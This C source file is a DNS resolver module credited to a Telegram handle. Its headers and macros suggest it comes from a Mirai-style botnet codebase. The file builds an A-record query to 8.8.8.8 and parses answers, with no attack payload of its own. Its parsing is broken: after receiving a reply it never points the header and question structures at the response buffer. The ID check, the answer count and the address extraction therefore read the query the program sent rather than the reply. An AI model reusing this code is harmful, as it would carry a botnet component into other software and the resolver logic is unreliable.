// by juan @ipmiv2 on telegram

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "headers/config.h"
#include "headers/resolv.h"
#include "headers/util.h"
#include "headers/rand.h"
#include "headers/protocol.h"

// Converts a domain name into a DNS-compliant hostname
void resolv_domain_to_hostname(char *dst_hostname, char *src_domain) {
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0) {
        char c = *src_domain++;

        if (c == '.' || c == 0) {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        } else {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

// Skips a domain name in the DNS response
static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count) {
    unsigned int jumped = 0, offset;
    *count = 1;

    while (*reader != 0) {
        if (*reader >= 192) { // Pointer to another part of the buffer
            offset = (*reader) * 256 + *(reader + 1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader++;
        if (!jumped)
            (*count)++;
    }

    if (jumped)
        (*count)++;
}

// Performs a DNS query to resolve a domain name to IP addresses
struct resolv_entries *resolv_lookup(char *domain) {
    struct resolv_entries *entries = calloc(1, sizeof(struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);
    struct dns_question *dnst = NULL;
    struct sockaddr_in addr = {0};
    int query_len = 0, tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    // Prepare the query
    resolv_domain_to_hostname(qname, domain);
    dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    query_len = sizeof(struct dnshdr) + util_strlen(qname) + 1 + sizeof(struct dns_question);

    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8, 8, 8, 8); // Google DNS
    addr.sin_port = htons(53);

    // Send the query and parse the response
    while (tries++ < 5) {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);

        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
#ifdef DEBUG
            printf("[resolv] Failed to connect\n");
#endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1) {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }

        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;

        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1) {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        } else if (nfds == 0) {
#ifdef DEBUG
            printf("[resolv] Timeout while resolving %s\n", domain);
#endif
            continue;
        } else if (FD_ISSET(fd, &fdset)) {
#ifdef DEBUG
            printf("[resolv] Got response\n");
#endif
            int ret = recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
            int remaining = ret;
            if (remaining < (int)(sizeof(struct dnshdr) + sizeof(struct dns_question)))
                continue;

            if (ntohs(dnsh->id) != dns_id || dnsh->ancount == 0)
                continue;

            uint16_t ancount = ntohs(dnsh->ancount);
            if (ancount > 100) ancount = 100;

            char *name = (char *)(dnst + 1);
            int name_len = util_strlen(domain) + 1;
            name += name_len + sizeof(struct dns_question);
            remaining -= (sizeof(struct dnshdr) + name_len + sizeof(struct dns_question));

            while (ancount-- > 0 && remaining > 0) {
                struct dns_resource *r_data = NULL;
                int stop;

                if ((size_t)remaining < sizeof(struct dns_resource))
                    break;
                resolv_skip_name((uint8_t *)name, (uint8_t *)response, &stop);
                name += stop;
                remaining -= stop;
                if (remaining <= 0) break;

                r_data = (struct dns_resource *)name;
                name += sizeof(struct dns_resource);
                remaining -= sizeof(struct dns_resource);
                if (remaining <= 0) break;

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP)) {
                    uint16_t data_len = ntohs(r_data->data_len);
                    if (data_len == 4 && remaining >= 4) {
                        ipv4_t *new_addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof(ipv4_t));
                        if (new_addrs == NULL) break;
                        entries->addrs = new_addrs;
                        entries->addrs[entries->addrs_len++] = *(uint32_t *)name;
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", *(uint32_t *)name);
#endif
                    }
                    name += data_len;
                    remaining -= data_len;
                } else {
                    resolv_skip_name((uint8_t *)name, (uint8_t *)response, &stop);
                    name += stop;
                    remaining -= stop;
                }
            }
        }
        break;
    }

    close(fd);

#ifdef DEBUG
    printf("[resolv] Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;

    resolv_entries_free(entries);
    return NULL;
}

// Frees memory allocated for resolved entries
void resolv_entries_free(struct resolv_entries *entries) {
    if (!entries)
        return;

    if (entries->addrs)
        free(entries->addrs);

    free(entries);
}
